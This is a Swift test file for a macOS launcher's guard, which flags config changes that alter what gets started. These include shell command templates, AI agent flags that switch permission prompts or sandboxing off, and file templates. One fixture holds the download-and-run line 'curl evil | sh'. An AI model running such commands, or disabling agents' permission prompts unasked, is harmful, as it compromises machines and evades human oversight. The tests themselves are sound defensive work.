import Foundation
import Testing
@testable import RightHereCore

/// What `new` would start that `old` (or, without one, the built-in setup) does not, one line each.
private func lines(_ new: String, over old: String? = nil) -> [String] {
    let known = old.map(LaunchCommands.init(configText:)) ?? LaunchCommands(.default)
    return LaunchCommands(configText: new).additions(to: known).map(\.line)
}

private let redefinedTerminal = """
[[app]]
id = "terminal"
name = "Terminal"
bundle_id = "com.apple.Terminal"
role = "terminal"
open_args = ["/usr/bin/id", "-un", "{dir}"]
run_args = ["/bin/sh", "-c", "{command}"]
"""

@Suite("LaunchCommands: what a config can make Right Here start")
struct LaunchCommandsTests {
    @Test func theBundleIdentifiersOfAnAppWithATemplateAreListedBecauseTheyDecideWhatAppMeans() {
        let known = "[[app]]\nid = \"mine\"\nname = \"Mine\"\nbundle_id = \"com.example.mine\"\nrole = \"terminal\"\nopen_args = [\"{app}/Contents/MacOS/mine\", \"{dir}\"]\n"
        let swapped = known.replacingOccurrences(of: "com.example.mine", with: "com.example.other")
        let found = lines(swapped, over: known)
        #expect(found.contains { $0.contains("[[app]] mine bundle_ids") && $0.contains("com.example.other") }, "\(found)")
    }

    @Test func aConfigThatSwitchesPermissionPromptsOffIsListedAsWhatItDoes() {
        // A synced config that sets `bypass_permissions` changes how every agent starts: the guard says so in those words, with the flag.
        let everywhere = lines("[general]\nbypass_permissions = true\nagents = [\"claude\", \"codex\"]\n")
        #expect(everywhere.contains { $0.contains("[agent.claude] bypass_permissions") && $0.contains("--dangerously-skip-permissions") })
        #expect(everywhere.contains { $0.contains("[agent.codex] bypass_permissions") && $0.contains("--dangerously-bypass-approvals-and-sandbox") })
        // The command itself did not change, so it is not listed as changed.
        #expect(!everywhere.contains { $0.contains("[agent.claude] command") })

        let oneAgent = lines("[agent.claude]\nbypass_permissions = true\n")
        #expect(oneAgent.contains { $0.contains("[agent.claude] bypass_permissions") })
        #expect(!oneAgent.contains { $0.contains("[agent.codex]") })

        let extra = lines("[agent.claude]\nargs = [\"--add-dir\", \"/\"]\n")
        #expect(extra.contains { $0.contains("[agent.claude] args") && $0.contains("--add-dir") })

        let custom = lines("[agent.claude]\nbypass_permissions = true\nbypass_permission_arg = \"--whatever\"\n")
        #expect(custom.contains { $0.contains("[agent.claude] bypass_permissions") && $0.contains("--whatever") })

        // And it stays quiet when nothing changed.
        #expect(lines("[general]\nbypass_permissions = true\n", over: "[general]\nbypass_permissions = true\n").isEmpty)
    }

    @Test func aConfigWithNothingCustomStartsNothingOfItsOwn() {
        #expect(LaunchCommands(configText: "").custom.isEmpty)
        #expect(LaunchCommands(configText: "[general]\nterminal = \"ghostty\"\neditor = \"vscode\"\nagents = [\"claude\", \"codex\"]\n[menu]\nitems = [\"open.terminal\"]\n").custom.isEmpty)
        #expect(LaunchCommands(.default).custom.isEmpty)
    }

    @Test func redefiningABuiltInTerminalWithTemplatesIsListed() {
        let found = lines(redefinedTerminal)
        #expect(found.contains(#"[[app]] terminal open_args = ["/usr/bin/id", "-un", "{dir}"]"#), "\(found)")
        #expect(found.contains(#"[[app]] terminal run_args = ["/bin/sh", "-c", "{command}"]"#), "\(found)")
    }

    @Test func aTemplateTheOtherConfigAlreadyHasIsNotListedAgain() {
        #expect(lines(redefinedTerminal, over: redefinedTerminal).isEmpty)
        #expect(lines(redefinedTerminal + "\n[general]\neditor = \"vscode\"\n", over: redefinedTerminal).isEmpty)
    }

    @Test func aChangedTemplateSaysWhatItWas() {
        let before = redefinedTerminal
        let after = redefinedTerminal.replacingOccurrences(of: "/bin/sh", with: "/bin/zsh")
        let found = lines(after, over: before)
        #expect(found == [#"[[app]] terminal run_args = ["/bin/zsh", "-c", "{command}"] (was ["/bin/sh", "-c", "{command}"])"#], "\(found)")
    }

    /// An app without templates starts nothing of its own, but its bundle identifier decides which app a click hands the selection to, and an
    /// app that runs what it is handed (Python Launcher) runs it: it is listed, as an assistant's change of it waits for the person.
    @Test func aPlainAppIsListedByTheAppItIsHandedTo() {
        let found = lines("[[app]]\nid = \"mine\"\nname = \"Mine\"\nbundle_id = \"com.example.mine\"\nrole = \"editor\"\n")
        #expect(found == [#"[[app]] mine bundle_ids = ["com.example.mine"]"#], "\(found)")
    }

    @Test func anAgentCommandIsListedWhetherCustomOrACallOnABuiltInOne() {
        let custom = lines("[general]\nagents = [\"mine\"]\n[agent.mine]\nname = \"Mine\"\ncommand = \"mine --yes\"\n")
        #expect(custom.contains(#"[agent.mine] command = "mine --yes""#), "\(custom)")
        let builtIn = lines("[agent.claude]\ncommand = \"claude --dangerously-skip-permissions\"\n")
        #expect(builtIn == [#"[agent.claude] command = "claude --dangerously-skip-permissions" (was "claude")"#], "\(builtIn)")
    }

    @Test func variantArgumentsAndTheFirstPromptFlagAreListed() {
        let found = lines("""
        [agent.claude]
        prompt_arg = "-p"
        [[agent.claude.variant]]
        id = "fast"
        title = "Fast"
        arguments = ["--model", "haiku"]
        """)
        #expect(found.contains(#"[agent.claude] prompt_arg = "-p" (was "positional")"#), "\(found)")
        #expect(found.contains(#"[[agent.claude.variant]] fast arguments = ["--model", "haiku"]"#), "\(found)")
    }

    @Test func aTerminalTheConfigListsAsAnotherKindOfAppIsListed() {
        // `[[app]]` under a built-in id replaces the built-in, role included: without a role it is a general app, and the planner would hand a general app the selected files. A terminal handed a file
        // runs it, so the config refuses it outright (the entry is left out): it is never something a pull could bring in unseen, and it is not listed because it is not there.
        let relabeled = "[[app]]\nid = \"terminal\"\nname = \"Terminal\"\nbundle_id = \"com.apple.Terminal\"\n"
        #expect(ConfigParser.parse(relabeled).hasErrors && ConfigParser.parse(relabeled).config.apps.isEmpty)
        #expect(lines(relabeled).isEmpty)
        // The same with another id and another case for a terminal's bundle identifier (Ghostty's).
        let alias = "[[app]]\nid = \"my-shell\"\nname = \"M\"\nbundle_id = \"COM.mitchellh.Ghostty\"\nrole = \"editor\"\n"
        #expect(ConfigParser.parse(alias).hasErrors && lines(alias).isEmpty)
        // A terminal that the config defines itself is a terminal to its builder too (2026-11-12): what carries its bundle identifier with another role is refused the same way, in any case, and so it
        // is not there to be listed.
        let own = "[[app]]\nid = \"mine\"\nname = \"Mine\"\nbundle_id = \"com.example.term\"\nrole = \"terminal\"\n[[app]]\nid = \"mine-too\"\nname = \"Mine Too\"\nbundle_id = \"Com.Example.TERM\"\nrole = \"general\"\n"
        func roles(_ text: String) -> [String] { lines(text).filter { $0.contains(" role ") } }
        #expect(ConfigParser.parse(own).hasErrors && ConfigParser.parse(own).config.app(id: "mine-too") == nil && roles(own).isEmpty)
        // The guard alone sees a terminal the config a pull has defines while the copy gives its bundle identifier another role, in any case: it lists that role.
        let known = "[[app]]\nid = \"mine\"\nname = \"Mine\"\nbundle_id = \"com.example.term\"\nrole = \"terminal\"\n"
        let copy = "[[app]]\nid = \"mine-too\"\nname = \"Mine Too\"\nbundle_id = \"Com.Example.TERM\"\nrole = \"general\"\n"
        #expect(!ConfigParser.parse(copy).hasErrors, "control: alone, the copy knows of no terminal with that identifier")
        let changes = LaunchCommands.changes(from: Data(known.utf8), to: Data(copy.utf8), overlay: nil).map(\.line).filter { $0.contains(" role ") }
        #expect(changes == [#"[[app]] mine-too role (a terminal handed a file runs it) = "general""#], "\(changes)")
        // A terminal that stays one, an editor with a bundle identifier of its own, and what the other config already has are not listed as a terminal handed files.
        #expect(roles("[[app]]\nid = \"terminal\"\nname = \"Terminal\"\nbundle_id = \"com.apple.Terminal\"\nrole = \"terminal\"\n").isEmpty)
        #expect(roles("[[app]]\nid = \"mine\"\nname = \"M\"\nbundle_id = \"com.example.editor\"\nrole = \"editor\"\n").isEmpty)
        #expect(lines(relabeled, over: relabeled).isEmpty)
    }

    @Test func anAgentPutInTheMenuWhileThePromptsAreOffIsListedAsWhatItIsAndOneThatWasOfferedAlreadyIsNot() {
        let off = "[general]\nbypass_permissions = true\nagents = [\"claude\"]\n"
        let more = "[general]\nbypass_permissions = true\nagents = [\"claude\", \"codex\"]\n"
        #expect(lines(more, over: off) == [#"[agent.codex] offered with its permission prompts switched off (it is in the menu or the Quick Actions) = "--dangerously-bypass-approvals-and-sandbox""#],
                "a copy that changes only which agents are offered, while the prompts are off")
        #expect(lines(off, over: off).isEmpty, "an agent that was offered already is not new")
        // The same through the menu or the Quick Actions, and not while the switch is off.
        #expect(lines(off + "\n[menu]\nitems = [\"agent.codex\"]\n", over: off).contains { $0.contains("[agent.codex] offered") })
        #expect(lines(off + "\n[services]\nitems = [\"agent.codex\"]\n", over: off).contains { $0.contains("[agent.codex] offered") })
        #expect(lines("[general]\nagents = [\"claude\", \"codex\"]\n", over: "[general]\nagents = [\"claude\"]\n").allSatisfy { !$0.contains("offered with its permission prompts") })
    }

    @Test func theDefaultTerminalCountsOnlyWhenItStartsThroughATemplate() {
        #expect(lines("[general]\nterminal = \"terminal\"\n").isEmpty)
        let template = "[[app]]\nid = \"mine\"\nname = \"Mine\"\nbundle_id = \"com.example.mine\"\nrole = \"terminal\"\nrun_args = [\"/bin/echo\", \"{dir}\", \"{command}\"]\n"
        #expect(lines("[general]\nterminal = \"mine\"\n" + template).contains(#"[general] terminal (starts through a command template) = "mine""#))
        #expect(!lines("[general]\nterminal = \"ghostty\"\n" + template).contains { $0.hasPrefix("[general]") })
        // Switching to a template the other config has too is still a change to say so about.
        #expect(lines("[general]\nterminal = \"mine\"\n" + template, over: "[general]\nterminal = \"ghostty\"\n" + template).count == 1)
    }

    @Test func somethingTheOtherConfigHasAndThisLacksIsNotListed() {
        #expect(lines("", over: redefinedTerminal).isEmpty)
        #expect(lines("[general]\nterminal = \"terminal\"\n", over: redefinedTerminal).isEmpty)
    }

    @Test func bytesThatCannotBeReadAsTextCountAsNothingKnown() {
        let known = LaunchCommands(configData: Data([0xff, 0xfe, 0x00]))
        #expect(LaunchCommands(configText: redefinedTerminal).additions(to: known).count == 3)
        // A byte order mark, which the config store drops before parsing, does not hide what follows it.
        #expect(LaunchCommands(configData: Data(("\u{FEFF}" + redefinedTerminal).utf8)) == LaunchCommands(configText: redefinedTerminal))
    }

    @Test func controlCharactersInAValueArePrintedEscaped() {
        // The config refuses such an argument where it is written; what a Config holds is printed whatever it is, so this is made without the parser.
        let config = Config(enabledAgents: ["claude"], agents: ["claude": .init(variants: [.init(id: "x", title: "X", arguments: ["--x\u{1b}[2J\u{9b}31m", "a\"b\\c"])])])
        let found = LaunchCommands(config).additions(to: LaunchCommands(.default)).map(\.line)
        let text = found.joined(separator: "\n")
        #expect(!text.unicodeScalars.contains { $0.properties.generalCategory == .control && $0 != "\n" }, "a control character reached the printed line")
        #expect(text.contains(#"\u001b[2J\u009b31m"#), "\(text)")
        #expect(text.contains(#""a\"b\\c""#), "quotes and backslashes stay readable: \(text)")
    }

    @Test func everySettingThatAnAssistantMayOnlyProposeHasAPlaceInWhatASyncedConfigCanStart() {
        // The sync folder is written by things this Mac does not control, and an assistant may not change these settings without the person: the two guards say the same thing.
        let text = """
        [general]
        bypass_permissions = true
        agents = ["claude"]

        [agent.claude]
        command = "claude --verbose"
        args = ["--add-dir", "../x"]
        prompt_arg = "-i"
        bypass_permission_arg = "--yes"
        launcher = "link"

        [[preset]]
        id = "push"
        title = "Push"
        prompt = "Push {files}"

        [[agent.claude.variant]]
        id = "fast"
        title = "Fast"
        arguments = ["--fast"]

        [[app]]
        id = "mine"
        name = "Mine"
        bundle_id = "com.example.mine"
        role = "terminal"
        open_args = ["/usr/bin/id", "-un", "{dir}"]
        run_args = ["/bin/sh", "-c", "{command}"]

        [[app]]
        id = "fake"
        name = "Fake"
        bundle_id = "com.example.elsewhere"
        role = "editor"

        [[new_file.template]]
        id = "notes"
        title = "Notes"
        extension = "plist"
        contents = "<plist/>"
        """
        let config = ConfigParser.parse(text).config
        // `fake` has the bundle identifier of a terminal that only the config a pull already has defines (in this one, a second entry for `mine`'s would be refused).
        let places = LaunchCommands(config, terminals: ["com.example.elsewhere"]).entries.map(\.place)
        let place: [String: String] = [
            "app.*.bundle_id": "[[app]] mine bundle_ids", "app.*.bundle_ids": "[[app]] mine bundle_ids", "app.*.role": "[[app]] fake role", "app.*.open_args": "[[app]] mine open_args", "app.*.run_args": "[[app]] mine run_args",
            "agent.*.command": "[agent.claude] command", "agent.*.args": "[agent.claude] args", "agent.*.prompt_arg": "[agent.claude] prompt_arg", "agent.*.bypass_permission_arg": "[agent.claude] bypass_permission_arg",
            "agent.*.variant.*.arguments": "[[agent.claude.variant]] fast arguments", "agent.*.bypass_permissions": "[agent.claude] bypass_permissions", "general.bypass_permissions": "[agent.claude] bypass_permissions",
            "new_file.template.*.contents": "[[new_file.template]] notes contents", "agent.*.launcher": "[agent.claude] launcher", "preset.*.prompt": "[[preset]] push prompt"
        ]
        #expect(Set(place.keys) == Set(ConfigTrust.programKeys.keys), "a setting that waits for the person has to have a place here, or a reason written in this test")
        for (key, fragment) in place { #expect(places.contains { $0.hasPrefix(fragment) }, "\(key) has no place that starts \(fragment): \(places)") }
    }

    @Test func howAnAgentStartsAndWhatAPresetTypesAfterItsCommandAreListedAndAChangeOfThemIsNew() {
        // The link starts Claude Code without its command and arguments, and a preset's prompt is typed after the command.
        #expect(lines("[agent.claude]\nlauncher = \"link\"\n").contains { $0.hasPrefix("[agent.claude] launcher") && $0.contains("\"link\"") })
        #expect(lines("[agent.claude]\nlauncher = \"terminal\"\n").isEmpty, "the terminal is how an agent starts when nothing says otherwise")
        let preset = "[[preset]]\nid = \"push\"\ntitle = \"Push\"\nprompt = \"Push {files}\"\n"
        #expect(lines(preset).contains { $0.hasPrefix("[[preset]] push prompt") && $0.contains("\"Push {files}\"") })
        #expect(lines(preset.replacingOccurrences(of: "Push {files}", with: "Push {files} to main"), over: preset).count == 1)
        #expect(lines(preset.replacingOccurrences(of: "title = \"Push\"", with: "title = \"Send\""), over: preset).isEmpty, "a title is what the menu shows")
        // A built-in preset as Right Here writes it is not one of the config's own.
        let review = AgentPreset.builtIn[0]
        #expect(lines("[[preset]]\nid = \"\(review.id)\"\ntitle = \"\(review.title)\"\nprompt = \"\(review.prompt)\"\n").isEmpty)
        // A template's name: the same text as `.zshenv` is read by every shell that starts.
        let template = { (name: String) in "[[new_file.template]]\nid = \"make\"\ntitle = \"Make\"\nbase_name = \"\(name)\"\nextension = \"\"\ncontents = \"all:\"\n" }
        #expect(lines(template(".zshenv"), over: template("Makefile")).count == 1)
        #expect(lines(template("Makefile"), over: template("Makefile")).isEmpty)
    }

    @Test func theFlagTheConfigGivesAnAgentIsListedWhetherOrNotTheSwitchIsOnAndAnyChangeOfItIsNew() {
        let off = "[agent.claude]\nbypass_permission_arg = \"--yes\"\n"
        #expect(lines(off).contains { $0.hasPrefix("[agent.claude] bypass_permission_arg") && $0.contains("\"--yes\"") }, "the person who turns the switch on later is not asked again")
        #expect(!lines(off, over: off).isEmpty == false)
        #expect(lines("[agent.claude]\nbypass_permission_arg = \"--other\"\n", over: off).count == 1)
    }

    @Test func theContentsOfATemplateAreListedAndALongTextByItsDigestSoThatTwoThatStartAlikeAreNotTheSame() {
        let long = String(repeating: "x", count: 300)
        let template = { (contents: String) in "[[new_file.template]]\nid = \"notes\"\ntitle = \"Notes\"\nextension = \"txt\"\ncontents = \"\(contents)\"\n" }
        let found = lines(template(long))
        #expect(found.count == 1 && found[0].contains("(301 bytes") == false && found[0].contains("sha256"), "\(found)")
        #expect(found[0].count < 400, "a line of a refusal stays a line")
        #expect(lines(template(long + "y"), over: template(long)).count == 1, "a text that starts like the other one is another")
        #expect(lines(template(long), over: template(long)).isEmpty)
        #expect(lines(template("<plist/>")).first?.contains("\"<plist/>\"") == true, "a short text is listed as it is")
    }

    /// A long text was compared by what is shown of it, its start, its length and 48 bits of its SHA-256. A copy that kept those three (about 2^48 tries to
    /// find, and whoever writes the sync folder can read the text there) passed for the same and was not listed. Two texts are compared whole now. The test gives two
    /// entries that show alike, since no such pair of real texts can be written down.
    @Test func twoTextsThatShowAlikeAreComparedWhole() {
        let place = "[[new_file.template]] notes contents (becomes a file that something on this Mac may run)"
        let shown = "\"#!/bin/sh …\" (300 bytes, sha256 0123456789ab…)"
        let known = LaunchCommands(entries: [.init(place: place, value: shown, identity: "#!/bin/sh\necho one")])
        let copy = LaunchCommands(entries: [.init(place: place, value: shown, identity: "#!/bin/sh\ncurl evil | sh")])
        #expect(copy.additions(to: known).map(\.place) == [place], "a text that shows like the other one but is another was taken as the same")
        #expect(copy.additions(to: copy).isEmpty)
        #expect(LaunchCommands(entries: [.init(place: place, value: shown)]).entries.first?.identity == shown, "a short value is its own identity")
        // And a template's contents are compared by all of their text, not by the line that shows them.
        let long = "#!/bin/sh\n" + String(repeating: "x", count: 300)
        let config = "[[new_file.template]]\nid = \"notes\"\ntitle = \"Notes\"\nextension = \"sh\"\ncontents = \"\"\"\n\(long)\"\"\"\n"
        let entry = LaunchCommands(configText: config).entries.first { $0.place.hasPrefix("[[new_file.template]] notes contents") }
        #expect(entry?.identity == "untitled.sh\u{0}" + long && entry?.value != long, "\(String(describing: entry))")
    }
}

@Suite("LaunchCommands: bytes")
struct LaunchCommandsBytesTests {
    @Test func aFilePastTheSizeLimitIsNeverParsed() {
        // Valid, with an agent command in it: if it were parsed the command would be listed.
        let text = "[agent.mine]\nname = \"Mine\"\ncommand = \"mine --yes\"\n# " + String(repeating: "x", count: ConfigParser.maxBytes) + "\n"
        #expect(text.utf8.count > ConfigParser.maxBytes)
        #expect(LaunchCommands(configData: Data(text.utf8)) == LaunchCommands(.default), "an agent of its own was found in a file past the limit")
        // The same text within the limit is read.
        #expect(LaunchCommands(configData: Data("[agent.mine]\nname = \"Mine\"\ncommand = \"mine --yes\"\n".utf8)) != LaunchCommands(.default))
    }

    @Test func emptyingTheArgumentsOfAnAgentThatIsStillThereIsAChangeOfWhatIsStarted() {
        // `--sandbox read-only` may be what keeps the agent in its sandbox: a copy from the sync folder that has none starts it another way.
        let known = "[general]\nagents = [\"codex\"]\n\n[agent.codex]\nargs = [\"--sandbox\", \"read-only\"]\n"
        let emptied = "[general]\nagents = [\"codex\"]\n\n[agent.codex]\nargs = []\n"
        let removed = "[general]\nagents = [\"codex\"]\n"
        #expect(lines(emptied, over: known) == ["[agent.codex] args = [] (was [\"--sandbox\", \"read-only\"])"], "\(lines(emptied, over: known))")
        #expect(lines(removed, over: known) == ["[agent.codex] args = [] (was [\"--sandbox\", \"read-only\"])"])
        // An agent that is gone starts nothing, and the same arguments are no change.
        #expect(lines("[general]\nagents = [\"claude\"]\n", over: "[general]\nagents = [\"claude\"]\n\n[agent.mine]\nname = \"Mine\"\ncommand = \"mine\"\nargs = [\"-v\"]\n").isEmpty)
        #expect(lines(known, over: known).isEmpty)
    }
}
